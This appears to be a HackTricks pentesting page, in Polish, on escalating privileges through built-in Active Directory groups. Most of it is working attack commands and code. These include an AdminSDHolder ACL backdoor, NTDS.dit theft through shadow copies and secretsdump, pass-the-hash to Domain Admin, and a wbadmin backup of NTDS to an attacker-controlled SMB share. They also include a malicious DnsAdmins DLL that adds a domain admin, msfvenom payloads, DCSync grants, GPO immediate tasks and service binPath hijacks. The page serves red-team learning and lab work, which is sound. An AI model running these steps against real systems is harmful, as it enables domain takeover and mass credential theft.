# Uprzywilejowane grupy

{{#include ../../banners/hacktricks-training.md}}

## Dobrze znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Ponadto umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodawanie nowych użytkowników jest dozwolone, podobnie jak logowanie lokalne do DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

Lista kontroli dostępu (ACL) grupy **AdminSDHolder** ma kluczowe znaczenie, ponieważ określa uprawnienia dla wszystkich „protected groups” w Active Directory, w tym grup o wysokich uprawnieniach. Mechanizm ten zapewnia bezpieczeństwo tych grup, zapobiegając nieautoryzowanym modyfikacjom.

Atakujący może to wykorzystać, modyfikując ACL grupy **AdminSDHolder** i przyznając standardowemu użytkownikowi pełne uprawnienia. W efekcie użytkownik ten uzyskałby pełną kontrolę nad wszystkimi protected groups. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną automatycznie przywrócone w ciągu godziny ze względu na sposób działania systemu.<sup>[[14]](#references)</sup>

Najnowsza dokumentacja Windows Server nadal traktuje kilka wbudowanych grup operatorów jako obiekty **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` itd.). Proces **SDProp** uruchamia się domyślnie co 60 minut na **PDC Emulator**, ustawia `adminCount=1` i wyłącza dziedziczenie dla chronionych obiektów. Jest to przydatne zarówno do persistence, jak i do wyszukiwania nieaktualnych uprzywilejowanych użytkowników, którzy zostali usunięci z protected group, ale nadal zachowują ACL bez dziedziczenia.<sup>[[12]](#references)</sup>

Polecenia służące do sprawdzania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Dostępny jest skrypt przyspieszający proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Więcej informacji można znaleźć na stronie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

Członkostwo w tej grupie umożliwia odczytywanie usuniętych obiektów Active Directory, co może ujawnić poufne informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Jest to przydatne do **odtwarzania wcześniejszych ścieżek uprawnień**. Usunięte obiekty mogą nadal ujawniać `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, stare SPN-y lub DN usuniętej uprzywilejowanej grupy, którą później może przywrócić inny operator.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom dostępu.

### Eskalacja uprawnień

Za pomocą `PsService` lub `sc` z Sysinternals można sprawdzać i modyfikować uprawnienia usług. Grupa `Server Operators` ma na przykład pełną kontrolę nad niektórymi usługami, co umożliwia wykonywanie dowolnych poleceń i eskalację uprawnień:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia manipulowanie usługami w celu uzyskania podwyższonych uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` dzięki uprawnieniom `SeBackup` i `SeRestore`. Uprawnienia te umożliwiają przechodzenie przez foldery, wyświetlanie ich zawartości i kopiowanie plików, nawet bez jawnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. Do tego procesu konieczne jest użycie określonych skryptów.<sup>[[1]](#references)</sup>

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, stosuje się następujące kroki:

1. Zaimportuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskiwanie dostępu do plików z ograniczonych katalogów i ich kopiowanie, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Bezpośredni dostęp do systemu plików Domain Controller umożliwia kradzież bazy danych `NTDS.dit`, która zawiera wszystkie hashe NTLM użytkowników i komputerów w domenie.

#### Using diskshadow.exe

1. Utwórz kopię w tle dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z kopii w tle:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM`, aby pobrać hashe:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashe z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Po ekstrakcji: Pass-the-Hash do DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Korzystanie z wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującego i zapisz poświadczenia SMB w pamięci podręcznej na maszynie docelowej.
2. Użyj `wbadmin.exe` do wykonania kopii zapasowej systemu i ekstrakcji `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Praktyczną demonstrację znajdziesz w [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej biblioteki DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na kontrolerach domeny. Ta możliwość stwarza znaczny potencjał do exploitacji.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Wykonywanie dowolnej biblioteki DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta luka umożliwia wykonywanie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zwykle na kontrolerach domeny). Problem ten został naprawiony w 2021 roku.

Członkowie mogą nakazać serwerowi DNS załadowanie dowolnej biblioteki DLL (lokalnie lub z udziału zdalnego) za pomocą poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponowne uruchomienie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby biblioteka DLL została załadowana:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Więcej informacji na temat tego wektora ataku można znaleźć na ired.team.

#### Mimilib.dll

Możliwe jest również użycie mimilib.dll do wykonywania poleceń poprzez jego modyfikację w celu wykonywania określonych poleceń lub reverse shells. [Sprawdź ten post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), aby uzyskać więcej informacji.<sup>[[15]](#references)</sup>

### Rekord WPAD dla MitM

DnsAdmins mogą manipulować rekordami DNS w celu przeprowadzania ataków Man-in-the-Middle (MitM), tworząc rekord WPAD po wyłączeniu globalnej listy blokowania zapytań. Narzędzia takie jak Responder lub Inveigh mogą być używane do spoofingu i przechwytywania ruchu sieciowego.

### Event Log Readers
Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajdując poufne informacje, takie jak hasła w plaintext lub szczegóły wykonywania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Uprawnienia Windows Exchange

Ta grupa może modyfikować listy DACL obiektu domeny, potencjalnie przyznając uprawnienia DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę zostały szczegółowo opisane w repozytorium GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Jeśli możesz działać jako członek tej grupy, klasycznym nadużyciem jest przyznanie kontrolowanemu przez atakującego podmiotowi uprawnień replikacji wymaganych do [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historycznie **PrivExchange** łączył dostęp do skrzynki pocztowej, wymuszone uwierzytelnianie Exchange oraz LDAP relay, aby uzyskać ten sam primitive. Nawet jeśli ta ścieżka relay jest ograniczona, bezpośrednie członkostwo w `Exchange Windows Permissions` lub kontrola nad serwerem Exchange nadal stanowią wartościową drogę do uzyskania praw do replikacji domeny.

## Hyper-V Administrators

Hyper-V Administrators mają pełny dostęp do Hyper-V, co można wykorzystać do przejęcia kontroli nad zwirtualizowanymi kontrolerami domeny. Obejmuje to klonowanie działających DC oraz ekstrakcję hashy NTLM z pliku NTDS.dit.

### Przykład wykorzystania

W praktyce nadużycie zwykle polega na **dostępie offline do dysków/punktów kontrolnych DC**, a nie na wykorzystaniu starych technik host-level LPE. Mając dostęp do hosta Hyper-V, operator może utworzyć punkt kontrolny lub wyeksportować zwirtualizowany kontroler domeny, zamontować VHDX oraz wyodrębnić `NTDS.dit`, `SYSTEM` i inne sekrety bez ingerowania w LSASS wewnątrz gościa:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Stamtąd ponownie użyj procedury `Backup Operators`, aby skopiować plik `Windows\NTDS\ntds.dit` oraz gałęzie rejestru offline.

## Group Policy Creators Owners

Ta grupa umożliwia członkom tworzenie zasad grupy w domenie. Jednak jej członkowie nie mogą stosować zasad grupy do użytkowników ani grup oraz nie mogą edytować istniejących GPO.

Istotny szczegół polega na tym, że **twórca staje się właścicielem nowego GPO** i zazwyczaj otrzymuje wystarczające uprawnienia, aby później je edytować. Oznacza to, że grupa ta jest interesująca, gdy możesz:

- utworzyć złośliwe GPO i przekonać administratora, aby połączył je z docelową jednostką OU/domeną
- edytować utworzone przez siebie GPO, które jest już połączone w użytecznym miejscu
- wykorzystać inne delegowane uprawnienie umożliwiające łączenie GPO, podczas gdy ta grupa zapewnia możliwość ich edycji

Praktyczne nadużycie zazwyczaj polega na dodaniu **Immediate Task**, **startup script**, **local admin membership** lub zmiany **user rights assignment** za pośrednictwem plików zasad przechowywanych w SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Jeśli edytujesz GPO ręcznie za pośrednictwem `SYSVOL`, pamiętaj, że sama zmiana nie wystarczy: należy również zaktualizować `versionNumber`, `GPT.ini`, a czasami także `gPCMachineExtensionNames`, w przeciwnym razie klienci zignorują odświeżenie policy.<sup>[[9]](#references)</sup>

## Organization Management

W środowiskach, w których wdrożono **Microsoft Exchange**, specjalna grupa o nazwie **Organization Management** ma istotne uprawnienia. Ta grupa ma uprawnienia do **uzyskiwania dostępu do skrzynek pocztowych wszystkich użytkowników domeny** oraz zapewnia **pełną kontrolę nad** jednostką organizacyjną (OU) **„Microsoft Exchange Security Groups”**. Kontrola ta obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do privilege escalation.

### Wykorzystywanie uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** mają kilka uprawnień, w tym **`SeLoadDriverPrivilege`**, które pozwala im **logować się lokalnie do Kontrolera domeny**, wyłączać go i zarządzać drukarkami. Aby wykorzystać te uprawnienia, szczególnie gdy **`SeLoadDriverPrivilege`** nie jest widoczne w kontekście bez podwyższonych uprawnień, konieczne jest obejście User Account Control (UAC).<sup>[[1]](#references)</sup>

Aby wyświetlić członków tej grupy, używa się następującego polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Na kontrolerach domeny ta grupa jest niebezpieczna, ponieważ domyślna zasada kontrolera domeny przyznaje **`SeLoadDriverPrivilege`** grupie `Print Operators`. Jeśli uzyskasz podwyższony token członka tej grupy, możesz włączyć to uprawnienie i załadować podpisany, ale podatny sterownik, aby uzyskać dostęp do kernela/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Szczegółowe informacje dotyczące obsługi tokenów znajdziesz w sekcji [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Członkowie tej grupy otrzymują dostęp do komputerów za pośrednictwem Remote Desktop Protocol (RDP). Do wyliczenia tych członków dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje na temat wykorzystywania RDP można znaleźć w dedykowanych materiałach pentestingowych.

#### Remote Management Users

Członkowie mogą uzyskiwać dostęp do komputerów za pośrednictwem **Windows Remote Management (WinRM)**. Enumerację tych członków można przeprowadzić za pomocą:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
W przypadku technik exploitation związanych z **WinRM** należy skorzystać z odpowiedniej dokumentacji.

#### Server Operators

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym do korzystania z uprawnień tworzenia i przywracania kopii zapasowych, zmiany czasu systemowego oraz wyłączania systemu.<sup>[[1]](#references)</sup> Aby wyświetlić członków tej grupy, użyj następującego polecenia:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Na kontrolerach domeny grupa `Server Operators` zwykle dziedziczy wystarczające uprawnienia do **ponownej konfiguracji lub uruchamiania/zatrzymywania usług**, a także otrzymuje `SeBackupPrivilege`/`SeRestorePrivilege` za pośrednictwem domyślnej zasad domeny. W praktyce czyni ją to pomostem między **nadużywaniem kontroli nad usługami** a **ekstrakcją NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Jeśli ACL usługi przyznaje tej grupie uprawnienia do zmiany/uruchamiania, wskaż w usłudze dowolne polecenie, uruchom ją jako `LocalSystem`, a następnie przywróć oryginalną wartość `binPath`. Jeśli kontrola usług jest ograniczona, skorzystaj z opisanych powyżej technik `Backup Operators`, aby skopiować `NTDS.dit`.

## References

- [1] [ired.team – Konta uprzywilejowane i uprawnienia tokenów](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Wykorzystanie SeLoadDriverPrivilege do eskalacji uprawnień](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Wykorzystanie uprawnień GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Wykorzystanie GPO, część 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Przewodnik red teamera po GPO i OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Funkcja ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonimowy LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Dodatek C: Chronione konta i grupy w Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Jak wykorzystać i zmodyfikować AdminSDHolder w celu uzyskania persistence Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Wykorzystanie uprawnienia DnsAdmins do eskalacji w Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informacje o wykorzystaniu krawędzi GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Funkcja NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
